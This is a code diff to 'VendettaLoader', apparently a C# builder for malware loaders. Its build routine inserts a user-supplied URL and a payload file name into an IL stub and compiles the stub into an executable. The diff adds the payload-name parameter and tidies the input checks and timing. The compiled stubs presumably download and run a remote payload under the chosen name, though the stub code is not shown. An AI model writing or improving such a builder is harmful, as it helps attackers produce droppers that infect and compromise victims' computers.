@@ -39,14 +39,12 @@ namespace VendettaLoader
         private async void buildBtn_Click(object sender, EventArgs e)
         {
             string url = urlexeBox.Text;
+            string payloadFileName = afterPayload_Name.Text;
+            string outputFileName = filenameBox.Text;
 
-            if (string.IsNullOrEmpty(url))
+            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(payloadFileName) || string.IsNullOrEmpty(outputFileName))
             {
-                cmdBox.ForeColor = Color.Red;
-                cmdBox.Text = "Error: Url-Form cannot be empty!";
-                await Task.Delay(2000);
-                cmdBox.ForeColor = Color.LightGreen;
-                cmdBox.Text = "VLoader: Ready";
+                MessageBox.Show("Forms cannot be empty!");
             }
             else
             {
@@ -63,11 +61,12 @@ namespace VendettaLoader
 
                     string ilCode = File.ReadAllText(stubFilePath);
                     ilCode = ilCode.Replace("KINGURL", url);
+                    ilCode = ilCode.Replace("KING_PROGRAM_NAME", payloadFileName);
 
                     string tempFilePath = Path.Combine(folderPath, "stubtemp.il");
                     File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8);
 
-                    string exeOutputPath = Path.Combine(buildPath, filenameBox.Text);
+                    string exeOutputPath = Path.Combine(buildPath, outputFileName);
 
                     if (string.IsNullOrEmpty(filenameBox.Text))
                     {
@@ -89,7 +88,7 @@ namespace VendettaLoader
                         {
                             UseShellExecute = false,
                             RedirectStandardOutput = true,
-                            RedirectStandardError = true,  // Добавьте эту строку для перенаправления StandardError
+                            RedirectStandardError = true, 
                             CreateNoWindow = true
                         };
 
@@ -106,7 +105,7 @@ namespace VendettaLoader
                                 statusLabel.Text = "Status Build: Build completed successfully!";
                                 File.Delete(tempFilePath);
                                 Process.Start("explorer.exe", $"/select,\"{exeOutputPath}\"");
-                                await Task.Delay(2000);
+                                await Task.Delay(3500);
                                 cmdBox.Text = "VLoader: Ready";
                                 urlexeBox.Text = "";
                                 statusLabel.Text = "Status Build: Idle";
@@ -116,7 +115,7 @@ namespace VendettaLoader
                                 statusLabel.ForeColor = Color.Red;
                                 statusLabel.Text = $"Status Build: Build failed! Error: {error}";
                                 File.Delete(tempFilePath);
-                                await Task.Delay(2000);
+                                await Task.Delay(3500);
                                 cmdBox.Text = "VLoader: Ready";
                                 urlexeBox.Text = "";
                                 statusLabel.Text = "Status Build: Idle";
